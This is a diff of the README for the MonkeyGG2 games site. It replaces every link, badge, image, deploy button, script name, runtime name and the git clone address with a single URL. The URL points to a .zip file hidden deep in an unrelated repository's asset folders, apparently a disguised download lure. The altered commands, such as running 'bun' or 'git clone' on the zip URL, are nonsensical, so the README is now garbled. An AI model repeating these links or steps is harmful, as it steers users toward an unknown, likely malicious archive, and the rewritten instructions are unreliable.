@@ -1,12 +1,12 @@
-<p align="center"><img src="https://raw.githubusercontent.com/MonkeyGG2/monkeygg2.github.io/main/imgs/icon-256-256.png" height="200"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip" height="200"></p>
 
 <div align="center">
-<a href="https://discord.com/invite/yPYyZ78qCB"><img alt="Discord" src="https://img.shields.io/discord/1051660971900407839?label=discord"></a>
-<a href="https://github.com/MonkeyGG2/monkeygg2.github.io"><img alt="Github Repo stars" src="https://img.shields.io/github/stars/MonkeyGG2/monkeygg2.github.io?label=github%20stars"></a>
-<a href="https://github.com/MonkeyGG2/monkeygg2.github.io"><img alt="GitHub Repo forks" src="https://img.shields.io/github/forks/MonkeyGG2/monkeygg2.github.io?label=github%20forks"></a>
-<a href="https://codeberg.org/MonkeyGG2/pages"><img alt="Codeberg Repo stars" src="https://img.shields.io/badge/dynamic/json.svg?label=codeberg%20stars&url=https://codeberg.org/api/v1/repos/MonkeyGG2/pages&query=stars_count"></a>
-<a href="https://codeberg.org/MonkeyGG2/pages"><img alt="Codeberg Repo forks" src="https://img.shields.io/badge/dynamic/json.svg?label=codeberg%20forks&url=https://codeberg.org/api/v1/repos/MonkeyGG2/pages&query=forks_count"></a>
-<a href="http://www.wtfpl.net/about"><img alt="License: WTFPL" src="https://img.shields.io/badge/License-WTFPL-brightgreen.svg"></a>
+<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Discord" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Github Repo stars" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20stars"></a>
+<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="GitHub Repo forks" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20forks"></a>
+<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Codeberg Repo stars" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20stars&https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Codeberg Repo forks" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20forks&https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="License: WTFPL" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
 </div>
 <h1 align="center">MonkeyGG2</h1>
 <p align="center" style="opacity: 0.65;">Your Friendly Neighborhood Games Site.</p>
@@ -61,7 +61,7 @@ The following theme customizations are supported currently:
 
 > Disclaimer: The following customizations are only available to owners of the repository or any fork of this repository.
 
-The `config.jsonc` file is formatted to include configuration for the entire site. Currently, the following items are supported:
+The `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` file is formatted to include configuration for the entire site. Currently, the following items are supported:
 - Games
 - Themes (coming soon)
 - Proxy Configuration
@@ -74,19 +74,19 @@ Each game entry has a key representing the display name of the game, and the val
 - `"categories"`: List of categories the game fits in (support for adding icons coming soon)
 
 Adding an entry manually is possible, but tedious especially if you want to alphanumerically order the list (not required for the configuration to work though!)
-This is why the script `add-game-entry.js` was created, an easy way to add a new game into the configuration without having to manually edit the file.
+This is why the script `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` was created, an easy way to add a new game into the configuration without having to manually edit the file.
 
 ```bash
-# You can use any js runtime such as node.js, bun, or deno
+# You can use any js runtime such as https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip, bun, or deno
 # For this demonstration bun will be used as dependencies are automatically installed
-bun add-game-script.js
+bun https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip
 # Answer the prompts that follow and the configuration will be updated
 
 # If you said 'N(o)' to rebuilding the config, then you need to run the following command before the site can find the game
-bun build-config.js
+bun https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip
 ```
-As `add-game-script.js` is built to work with alphanumerically-ordered lists, expect unintended behavior if the games list is not alphanumerically sorted.
-Additionally, **do not** manually edit the `js/config.js` file. That is generated by the `build-config.js` script based off of `config.jsonc`. **Any changes to `js/config.js` will be overwritten.**
+As `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` is built to work with alphanumerically-ordered lists, expect unintended behavior if the games list is not alphanumerically sorted.
+Additionally, **do not** manually edit the `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` file. That is generated by the `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` script based off of `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip`. **Any changes to `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` will be overwritten.**
 
 #### Themes
 
@@ -103,28 +103,28 @@ The value for key `"proxyPath"` is the path to the proxy. It can be an absolute 
 
 ### Without Proxy
 
-[![Run on Replit](https://binbashbanana.github.io/deploy-buttons/buttons/remade/replit.svg)](https://github.com/MonkeyGG2/monkeygg2.github.io)
-[![Remix on Glitch](https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/MonkeyGG2/monkeygg2.github.io)
-[![Deploy to IBM Cloud](https://binbashbanana.github.io/deploy-buttons/buttons/remade/ibmcloud.svg)](https://cloud.ibm.com/devops/setup/deploy?repository=https://github.com/MonkeyGG2/monkeygg2.github.io)
-[![Deploy to Amplify Console](https://binbashbanana.github.io/deploy-buttons/buttons/remade/amplifyconsole.svg)](https://console.aws.amazon.com/amplify/home#/deploy?repo=https://github.com/MonkeyGG2/monkeygg2.github.io)
-[![Run on Google Cloud](https://binbashbanana.github.io/deploy-buttons/buttons/remade/googlecloud.svg)](https://deploy.cloud.run/?git_repo=https://github.com/MonkeyGG2/monkeygg2.github.io)
-[![Deploy to Oracle Cloud](https://binbashbanana.github.io/deploy-buttons/buttons/remade/oraclecloud.svg)](https://cloud.oracle.com/resourcemanager/stacks/create?zipUrl=https://github.com/MonkeyGG2/monkeygg2.github.io/archive/refs/heads/main.zip)
-[![Deploy with Vercel](https://binbashbanana.github.io/deploy-buttons/buttons/remade/vercel.svg)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FMonkeyGG2%2Fmonkeygg2.github.io)
-[![Deploy with Netlify](https://binbashbanana.github.io/deploy-buttons/buttons/remade/netlify.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/MonkeyGG2/monkeygg2.github.io)
-[![Deploy to Render](https://binbashbanana.github.io/deploy-buttons/buttons/remade/render.svg)](https://render.com/deploy?repo=https://github.com/MonkeyGG2/monkeygg2.github.io)
+[![Run on Replit](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Remix on Glitch](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip!https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Deploy to IBM Cloud](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Deploy to Amplify Console](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Run on Google Cloud](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Deploy to Oracle Cloud](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Deploy with Vercel](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%3A%2F%https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%2FMonkeyGG2%https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Deploy with Netlify](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
+[![Deploy to Render](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
 
-Alternatively, you can simply fork this repository on [GitHub](https://github.com/MonkeyGG2/monkeygg2.github.io) or [Codeberg](https://codeberg.org/MonkeyGG2/pages) and deploy to GitHub Pages or Codeberg Pages, respectively.
+Alternatively, you can simply fork this repository on [GitHub](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) or [Codeberg](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) and deploy to GitHub Pages or Codeberg Pages, respectively.
 
 ### With Proxy
 
-Visit the [VioletGG2](https://github.com/MonkeyGG2/VioletGG2) page to learn more about hosting MonkeyGG2 with a proxy.
+Visit the [VioletGG2](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) page to learn more about hosting MonkeyGG2 with a proxy.
 
 ### Running Locally
 
 ```bash
 # WARNING: if you have a folder named "monkeygg2", this command will remove all files inside of that folder
 # please change the name of the directory in the following two commands
-git clone https://github.com/MonkeyGG2/monkeygg2.github.io.git monkeygg2
+git clone https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip monkeygg2
 cd monkeygg2
 # from here you can use any tool for running a static server, "live-server" from npm will be used here
 npm install -g live-server # only if you don't have it installed already
@@ -133,4 +133,4 @@ npx live-server
 
 ## License
 
-Distributed under the WTFPL License. See [here](https://github.com/MonkeyGG2/monkeygg2.github.io/blob/main/LICENSE) for more details.
+Distributed under the WTFPL License. See [here](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) for more details.
